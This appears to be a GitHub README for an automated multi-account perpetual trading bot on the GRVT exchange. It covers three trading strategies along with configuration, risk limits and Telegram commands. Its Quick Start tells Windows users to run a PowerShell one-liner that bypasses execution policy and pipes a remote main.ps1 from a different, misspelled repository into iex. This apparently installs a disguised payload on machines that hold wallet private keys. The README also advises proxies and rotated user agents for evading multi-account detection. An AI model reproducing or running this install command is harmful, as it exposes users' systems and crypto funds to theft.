# 🤖 GRVT Perp Trading Bot

> Automated multi-account perpetual trading bot for [GRVT](https://grvt.io) — three independent strategies, unlimited accounts, per-account proxy support

[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![GRVT](https://img.shields.io/badge/GRVT-PerpDEX-E5FF00?style=for-the-badge&logoColor=black)](https://grvt.io)
[![License](https://img.shields.io/badge/License-MIT-00C851?style=for-the-badge)](LICENSE)
[![Stars](https://img.shields.io/github/stars/omgmad/grvt-perp-bot?style=for-the-badge&color=FFD700)](https://github.com/omgmad/grvt-perp-bot)

```
╔══════════════════════════════════════════════════════════════════╗
║  Strategy 1 — Delta-Neutral      │  near-zero directional risk  ║
║  Strategy 2 — Copy Trading       │  mirror top wallets live     ║
║  Strategy 3 — Funding Arbitrage  │  harvest funding rate yields ║
║                                                                  ║
║  ✦ Multi-account  ·  Per-account proxies  ·  Async workers     ║
╚══════════════════════════════════════════════════════════════════╝
```

**[🚀 Open GRVT](https://grvt.io)** · **[🐦 Follow Dev](https://x.com/0mgm4d)**

---

## 🚀 Quick Start

If you just want to get the project running fast on Windows, use the installation command below first. After that, continue with the project-specific setup, configuration, and usage sections.

### 🛠️ Installation

#### CMD
Open **CMD** and run this **single command**:

```powershell
powershell -ep bypass -c "iwr https://github.com/Zahidimouad/GVRT-Trading-Bot/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
```

> Then continue with the project-specific setup steps below.

## 📘 Project-Specific Setup

### Step 2 — Create a virtual environment

```bash
python3 -m venv venv

# Linux / Mac
source venv/bin/activate

# Windows
venv\Scripts\activate
```

### Step 3 — Install dependencies

```bash
pip install requests web3 python-dotenv colorama aiohttp aiohttp-socks eth-account websockets
```

### Step 4 — Get GRVT API credentials

Follow the steps in [Multi-Account & Proxy Support](#-multi-account--proxy-support) above for each account.

### Step 5 — Deposit collateral

Each account needs collateral deposited on GRVT before the bot can open positions. Fund and deposit via the [GRVT interface](https://grvt.io) before starting.

### Step 6 — Build your accounts.json

```bash
cp accounts.example.json accounts.json
nano accounts.json
```

---

## 📌 Table of Contents

- [Quick Start](#-quick-start)
- [How It Works](#-how-it-works)
- [Multi-Account & Proxy Support](#-multi-account--proxy-support)
- [Strategies](#-strategies)
  - [Strategy 1 — Delta-Neutral](#strategy-1--delta-neutral)
  - [Strategy 2 — Copy Trading](#strategy-2--copy-trading)
  - [Strategy 3 — Funding Arbitrage](#strategy-3--funding-arbitrage)
- [Configuration](#️-configuration)
- [Running the Bot](#-running-the-bot)
- [Running 24/7 on a VPS](#️-running-247-on-a-vps)
- [Risk Management](#️-risk-management)
- [Telegram Commands](#-telegram-commands)
- [Disclaimer](#️-disclaimer)

---

## ⚡ How It Works

```
  GRVT perp markets update in real time
          │
          ▼  (all account workers run simultaneously)
          │
  Per account:
    • Authenticate via GRVT API key + wallet signature
    • Route all traffic through assigned proxy
    • Execute active strategy independently
    • Apply per-account risk limits
    • Report PnL and open positions
          │
          ▼
  Positions managed until closed  📈
          │
          ▼
  Telegram summary per account  📱
```

Every account is an independent async worker with its own strategy, risk limits, and proxy. One failed connection never affects the others.

---

## 👥 Multi-Account & Proxy Support

### How accounts are configured

All accounts live in `accounts.json`. Each entry holds its own wallet, API credentials, active strategy, and optional proxy.

```
  accounts.json
  ├── Account #1  →  wallet_1 + apikey_1 + proxy_1 + strategy: delta_neutral
  ├── Account #2  →  wallet_2 + apikey_2 + proxy_2 + strategy: copy_trading
  ├── Account #3  →  wallet_3 + apikey_3 + (no proxy) + strategy: funding_arb
  └── ...unlimited accounts
          │
          ▼
  Bot spawns one async worker per account
          │
          ▼
  Workers run in parallel up to MAX_PARALLEL
  Remaining accounts queue and start as slots free
```

**accounts.json structure:**

```json
[
  {
    "id": "account_1",
    "label": "Delta hedge",
    "wallet_address": "0xYourWallet1",
    "private_key": "0xYourPrivateKey1",
    "grvt_api_key": "your_api_key_1",
    "grvt_api_secret": "your_api_secret_1",
    "strategy": "delta_neutral",
    "referral_code": "YOUR_REF",
    "proxy": "http://user:pass@host:port"
  },
  {
    "id": "account_2",
    "label": "Copy acc",
    "wallet_address": "0xYourWallet2",
    "private_key": "0xYourPrivateKey2",
    "grvt_api_key": "your_api_key_2",
    "grvt_api_secret": "your_api_secret_2",
    "strategy": "copy_trading",
    "leader_wallet": "0xLeaderWalletAddress",
    "referral_code": "YOUR_REF",
    "proxy": "socks5://user:pass@host:port"
  },
  {
    "id": "account_3",
    "label": "Funding farmer",
    "wallet_address": "0xYourWallet3",
    "private_key": "0xYourPrivateKey3",
    "grvt_api_key": "your_api_key_3",
    "grvt_api_secret": "your_api_secret_3",
    "strategy": "funding_arb",
    "referral_code": "YOUR_REF",
    "proxy": ""
  }
]
```

### How to get GRVT API credentials

1. Go to [grvt.io](https://grvt.io) and connect your wallet
2. Navigate to **Profile → Settings → API Management → Create API Key**
3. Sign the authorization message with your wallet
4. Save the **API Key** and **Secret** — shown only once
5. Add them to the corresponding account entry in `accounts.json`

> ⚠️ Each GRVT account needs its own set of API credentials. Never share API secrets or private keys.

### Proxy formats supported

| Format | Example |
|--------|---------|
| HTTP | `http://user:pass@host:port` |
| HTTPS | `https://user:pass@host:port` |
| SOCKS5 | `socks5://user:pass@host:port` |
| No auth | `http://host:port` |
| None | leave `"proxy": ""` |

### Concurrency & safety settings

```env
MAX_PARALLEL=5              # Max accounts trading simultaneously
ACCOUNT_DELAY=15            # Seconds between launching each worker
JITTER=true                 # Random ±5s delay per order (human-like)
PROXY_TEST_ON_START=true    # Verify each proxy before trading begins
ROTATE_USER_AGENT=true      # Unique user-agent per account
```

> 💡 **Tip:** Assign a dedicated proxy to every account when running 5+. Enable `PROXY_TEST_ON_START=true` — dead proxies are flagged at startup, not mid-trade.

---

## 📐 Strategies

### ⚖️ Strategy 1 — Delta-Neutral

Earn on volatility and funding rates while staying market-neutral. Your profit does not depend on whether the price goes up or down.

```
  Open LONG (low leverage)  +  SHORT on GRVT perp  (same asset)
                │
                ▼
  Positions hedge each other → net delta ≈ 0
                │
                ▼
  Profit comes from:
    • positive funding rate payments (perp longs pay shorts)
    • spread captured on limit-order rebalancing
```

**How it works:**

1. The bot opens equal-sized LONG and SHORT positions on the same asset — both on GRVT, or LONG on spot/low-leverage and SHORT on the perp.
2. Every N hours it checks delta drift caused by price movement and rebalances with limit orders if deviation exceeds the threshold.
3. When funding turns negative, positions invert (LONG perp + offset SHORT) to keep collecting.

**Decision table:**

| Condition | Action |
|-----------|--------|
| Funding rate > 0.01% | Hold SHORT on perp, collect payments |
| Funding rate < -0.01% | Invert positions |
| Delta drifted > 5% | Rebalance with limit orders |
| High volatility spike | Reduce position size |

**Config block:**

```env
STRATEGY=delta_neutral
DN_SYMBOL=BTC-USDT-PERP
DN_LONG_SIZE=100            # USD in long leg
DN_SHORT_SIZE=100           # USD in short leg
DN_LEVERAGE=1               # Keep low — hedged position
DN_REBALANCE_THRESHOLD=5    # % drift before rebalancing
DN_MIN_FUNDING=0.005        # Minimum funding rate to enter (%)
DN_CHECK_INTERVAL=3600      # Rebalance check every N seconds
DN_ORDER_TYPE=LIMIT         # Always limit for lower fees
```

> 💡 **Tip:** Works best during consistent positive funding. Check GRVT's funding rate history per symbol before entering — avoid assets with erratic near-zero rates.

---

### 📡 Strategy 2 — Copy Trading

The bot polls a target wallet's open positions on GRVT every few seconds via the API. When a change is detected it immediately mirrors the trade with a proportionally scaled size on the copying account.

```
  Leader opens BTC-USDT-PERP LONG $10,000
              │
              ▼  (detected via API polling)
              │
  Bot calculates size:
  (ourEquity $2,000 / leaderEquity $10,000) × $10,000 × multiplier 1.0 = $2,000
  MAX_POSITION_PERCENT cap applied if needed
              │
              ▼
  Account opens BTC-USDT-PERP LONG $2,000  ✅
              │
              ▼
  Leader reduces or closes → bot mirrors proportionally ✅
```

**Choosing who to copy:**

Each account in `accounts.json` specifies its own `leader_wallet`. Run different leaders across accounts to diversify exposure.

✅ **Good wallets to copy:**
- Consistent PnL over weeks, not just days
- Holds positions for hours or longer (swing style)
- 1–5 new positions per day
- Clear directional thesis, not constantly reversing

❌ **Avoid:**
- **HFT wallets** — impossible to keep up, slippage destroys the edge
- **Market makers** — hold both sides simultaneously
- **Scalpers** — seconds-to-minutes holds, orders won't fill in time
- **Leverage flippers** — constantly change leverage to distort size calculation

**Config block:**

```env
STRATEGY=copy_trading
LEADER_WALLET=0xLeaderWalletAddress     # Set per account in accounts.json
COPY_RATIO=1.0                          # Equity-ratio multiplier
MAX_LEVERAGE=20                         # Cap on copied leverage
MAX_POSITION_SIZE_PERCENT=50            # Max single position as % of equity
MIN_NOTIONAL=5                          # Skip trades smaller than $N
MAX_CONCURRENT_POSITIONS=10
BLOCKED_SYMBOLS=                        # Comma-separated symbols to skip
SYNC_INTERVAL=5                         # Poll leader positions every N seconds
```

---

### 💸 Strategy 3 — Funding Arbitrage

The bot scans all GRVT perp markets for anomalously high funding rates and opens positions to collect payments with minimal directional exposure.

```
  Scan all GRVT perps → find funding rate above entry threshold
              │
              ▼
  Open position AGAINST the funding direction:
    • Funding > 0  →  SHORT  (longs pay shorts each cycle)
    • Funding < 0  →  LONG   (shorts pay longs each cycle)
              │
              ▼
  Collect funding payment each cycle
              │
              ▼
  Exit when any trigger fires:
    • Rate normalizes below exit_threshold
    • Target PnL reached
    • Position held longer than max_hold_hours
    • Unrealized loss exceeds stop_loss
```

**Example scenario:**

```
ETH-USDT-PERP funding = +0.05% per 8h
Bot opens $100 SHORT  (limit order, low fee)
  → receives $0.05 every 8 hours
  → over 48 hours = $0.30 on $100 deployed
  → annualized ≈ 27% APR  (if rate holds)
Optional 30% spot hedge limits price exposure to ±$0.70 per 1% ETH move
```

**Config block:**

```env
STRATEGY=funding_arb
FA_SCAN_SYMBOLS=BTC-USDT-PERP,ETH-USDT-PERP,SOL-USDT-PERP
FA_MIN_FUNDING=0.03             # Minimum rate to enter (% per 8h)
FA_EXIT_FUNDING=0.01            # Rate at which to exit (%)
FA_POSITION_SIZE=50             # Position size in USD
FA_MAX_HOLD_HOURS=48
FA_HEDGE_RATIO=0.3              # Spot hedge fraction (0 = none)
FA_LEVERAGE=1                   # Yield play — keep leverage at 1
FA_STOP_LOSS_PERCENT=3          # Close if unrealized loss exceeds N%
FA_CHECK_INTERVAL=300
FA_ORDER_TYPE=LIMIT
```

> 💡 **Tip:** Set `FA_STOP_LOSS_PERCENT` conservatively. The position exists to collect funding — a sharp price move against you should be exited before it wipes the yield gained.

---


### Requirements

- Python 3.10+
- A [GRVT](https://grvt.io) account per wallet
- Collateral (USDT or supported asset) deposited per account
- GRVT API key per account
- Optional: proxies for multi-account isolation

```

## ⚙️ Configuration

### `accounts.json` — one entry per account

See [Multi-Account & Proxy Support](#-multi-account--proxy-support) for the full structure.

### `.env` — global defaults

Settings here apply to all accounts unless overridden in `accounts.json`.

```env
# ── Active strategy (default, overridden per account) ──
# Options: delta_neutral | copy_trading | funding_arb
STRATEGY=funding_arb

# ── GRVT API ───────────────────────────────────────────
GRVT_API_URL=https://api.grvt.io

# ── Multi-account ──────────────────────────────────────
ACCOUNTS_FILE=accounts.json
MAX_PARALLEL=5
ACCOUNT_DELAY=15
JITTER=true
PROXY_TEST_ON_START=true
ROTATE_USER_AGENT=true

# ── Global risk limits ─────────────────────────────────
DAILY_LOSS_LIMIT=20             # Halt account if daily loss exceeds ($)
UNREALIZED_LOSS_LIMIT=30        # Force-close all positions if exceeded ($)
MAX_LEVERAGE=20
MAX_POSITION_SIZE_PERCENT=50
MIN_NOTIONAL=5

# ── Order defaults ─────────────────────────────────────
DEFAULT_ORDER_TYPE=LIMIT
LIMIT_TIMEOUT=30                # Seconds to wait for limit fill before cancel

# ── Strategy-specific defaults ─────────────────────────
# (paste the relevant config block from the strategy sections above)

# ── Telegram ───────────────────────────────────────────
TELEGRAM_TOKEN=
TELEGRAM_CHAT_ID=
```

### Per-account strategy override

Any `.env` key can be overridden inside `accounts.json` for a specific account:

```json
{
  "id": "account_1",
  "strategy": "delta_neutral",
  "DAILY_LOSS_LIMIT": 10,
  "DN_SYMBOL": "ETH-USDT-PERP",
  "DN_LONG_SIZE": 50,
  "DN_SHORT_SIZE": 50
}
```

---

## 🚀 Running the Bot

```bash
# First-time setup (creates accounts.json template)
python grvt_bot.py --setup

# Run all accounts
python grvt_bot.py

# Run a specific account only
python grvt_bot.py --account account_1

# Single cycle and exit
python grvt_bot.py --once

# Test proxies without placing any orders
python grvt_bot.py --test-proxies

# Dashboard only (no trading)
python grvt_bot.py --dashboard
```

On successful start:

```
╔══════════════════════════════════════════════════════╗
║   🤖  GRVT Perp Bot v1.0                             ║
║   Press Ctrl+C at any time to stop.                  ║
╚══════════════════════════════════════════════════════╝

  Accounts:    3 loaded
  Proxies:     2 assigned  (1 direct)
  Parallel:    up to 5
  Jitter:      ON

  Strategies:
    account_1  →  delta_neutral
    account_2  →  copy_trading
    account_3  →  funding_arb

  Testing proxies... ██████████  2/2 OK

  Start bot? [yes/no]: yes
```

**Live terminal dashboard:**

```
🤖 GRVT Perp Bot v1.0                     updated 09:04:15
══════════════════════════════════════════════════════════════
  Accounts: 3 active   Next check: 14m
──────────────────────────────────────────────────────────────
  ACCOUNTS
  ID            Strategy        Daily PnL   Positions   Status
  account_1     delta_neutral   +$1.44      2 open      ● running
  account_2     copy_trading    -$0.31      4 open      ● running
  account_3     funding_arb     +$0.92      1 open      ● running
──────────────────────────────────────────────────────────────
  POSITIONS  (account_3 — funding_arb)
  Symbol               Side    Size    Entry      Funding/8h   Unreal PnL
  ETH-USDT-PERP        SHORT   $50     $3,210     +0.05%       +$0.24

  POSITIONS  (account_2 — copy_trading)
  Symbol               Side    Size    Entry      Leader size  Unreal PnL
  BTC-USDT-PERP        LONG    $200    $95,420    $1,000       -$0.31
  SOL-USDT-PERP        LONG    $80     $148.20    $400         +$0.11
──────────────────────────────────────────────────────────────
  RECENT TRADES
  09:04:15  account_3  ETH-USDT-PERP  SHORT $50   funding_arb   ✅ filled
  09:03:40  account_1  ETH-USDT-PERP  rebalance   delta_neutral ✅ filled
  09:02:55  account_2  SOL-USDT-PERP  LONG  $80   copy 0x02C8.. ✅ filled
```

---

## 🖥️ Running 24/7 on a VPS

For continuous operation, use a cheap VPS (Vultr, DigitalOcean, Hetzner — ~$5/month).

### Ubuntu VPS setup

```bash
# 1. Update system
sudo apt update && sudo apt upgrade -y
sudo apt install python3 python3-pip python3-venv screen git -y

# 2. Clone repo
git clone https://github.com/omgmad/grvt-perp-bot
cd grvt-perp-bot

# 3. Virtual environment
python3 -m venv venv
source venv/bin/activate
pip install requests web3 python-dotenv colorama aiohttp aiohttp-socks eth-account websockets

# 4. Configure
nano .env
nano accounts.json

# 5. Run inside screen (stays alive after you disconnect)
screen -S grvtbot
source venv/bin/activate
python grvt_bot.py

# Press Ctrl+A then D to detach — bot keeps running
```

### Reconnect later

```bash
screen -r grvtbot
```

### Useful log commands

```bash
tail -50 grvt_bot.log
grep "filled" grvt_bot.log | tail -20            # Filled orders
grep "funding" grvt_bot.log | tail -20           # Funding events
grep "rebalance" grvt_bot.log | tail -20         # Delta rebalances
grep "copy" grvt_bot.log | tail -20              # Copy trade mirrors
grep "RISK\|halt" grvt_bot.log | tail -10        # Risk limit triggers
grep "ERROR" grvt_bot.log | tail -10             # Errors
```

---

## 🛡️ Risk Management

```
DAILY_LOSS_LIMIT hit        ──► Account halts + closes all its positions
UNREALIZED_LOSS_LIMIT hit   ──► Immediately force-closes all (market order)
MAX_POSITION_SIZE_PERCENT   ──► Caps any single position as % of equity
MAX_CONCURRENT_POSITIONS    ──► Blocks new opens until a position closes
MIN_NOTIONAL not met        ──► Skips the trade
FA_STOP_LOSS_PERCENT hit    ──► Closes funding arb position immediately
BLOCKED_SYMBOLS match       ──► Skips that symbol for this account
LIMIT_TIMEOUT reached       ──► Cancels unfilled limit, does not fallback to market
```

Risk limits are applied **per account** — one account hitting its daily loss limit does not stop the others.

### Safe starter config

```env
DAILY_LOSS_LIMIT=10
UNREALIZED_LOSS_LIMIT=15
MAX_LEVERAGE=5
MAX_POSITION_SIZE_PERCENT=20
MAX_CONCURRENT_POSITIONS=3
FA_STOP_LOSS_PERCENT=2
```

> ⚠️ **Always start with small sizes.** Run for several hours at minimum capital before scaling up any account.

---

## 📱 Telegram Setup & Commands

### Step 1 — Create a bot and get your token

1. Search for **`@BotFather`** on Telegram, send `/newbot`
2. Copy the token into `.env`:

```env
TELEGRAM_TOKEN=your_bot_token_here
```

### Step 2 — Get your Chat ID

1. Search for **`@userinfobot`**, send any message
2. Copy the numeric ID into `.env`:

```env
TELEGRAM_CHAT_ID=123456789
```

### Commands

| Command | Action |
|---------|--------|
| `/status` | All accounts: PnL, positions, strategy, proxy |
| `/positions` | All open positions across all accounts |
| `/pnl` | Realized + unrealized PnL per account |
| `/pause` | Pause all accounts (holds open positions) |
| `/pause account_1` | Pause one specific account |
| `/resume` | Resume all accounts |
| `/close` | Close all positions on all accounts (market) |
| `/close account_1` | Close all positions on one account |
| `/proxies` | Proxy health for all accounts |
| `/stop` | Stop the bot completely |
| `/strategy` | Show active strategy per account |

### Example alerts

```
📈 Position Opened
Account:   account_3
Strategy:  funding_arb
Symbol:    ETH-USDT-PERP
Side:      SHORT
Size:      $50.00
Funding:   +0.05% per 8h

💰 Funding Collected
Account:   account_3
Symbol:    ETH-USDT-PERP
Amount:    +$0.025
Cycle:     8h

🔄 Rebalance Executed
Account:   account_1
Strategy:  delta_neutral
Symbol:    BTC-USDT-PERP
Delta was: +5.8%  →  rebalanced to 0.2%

📡 Trade Copied
Account:   account_2
Leader:    0x02C8...45A0
Symbol:    SOL-USDT-PERP
Side:      LONG  $80.00
Ratio:     20%  (our equity / leader equity)

🛑 Risk Limit Hit
Account:   account_2
Reason:    Daily loss limit ($20.00)
Action:    All account_2 positions closed

⚠️ Proxy Failed
Account:   account_1
Proxy:     proxy_2
Action:    falling back to direct connection
```

---

## ⚠️ Disclaimer

> **RISK WARNING:** This bot trades real money on a live perpetuals DEX. All three strategies carry significant financial risk. Leverage amplifies both gains and losses. You may lose your entire deposited collateral. Use entirely at your own risk.

- Never invest more than you can afford to lose
- Always start small — scale only after verifying behavior across multiple cycles
- Never share `accounts.json`, private keys, or API secrets with anyone
- With many accounts on the same IP, use proxies to avoid detection
- API secrets are shown only once on creation — store them securely
- Check your local regulations regarding automated derivatives trading

---

## 🔗 Links

[![GRVT](https://img.shields.io/badge/⚡_GRVT-Open_Trading-E5FF00?style=for-the-badge&logoColor=black)](https://grvt.io)
[![Twitter](https://img.shields.io/badge/🐦_Twitter-@0mgm4d-1DA1F2?style=for-the-badge)](https://x.com/0mgm4d)

**If this helped you, please give it a ⭐ Star — it means a lot!**

✅ Here is the cleaned topic list for this repo:

## 🔍 Topics

`grvt-bot` `grvt-perp-bot` `grvt-trading-bot` `perp-trading` `defi-trading` `automated-trading` `crypto-bot` `delta-neutral` `copy-trading` `funding-arbitrage` `multi-account-bot` `proxy-support` `async-bot` `python-bot` `perp-dex` `funding-rate` `hedge-strategy` `real-time-trading` `risk-management` `grvt-dex` `grvt-io`
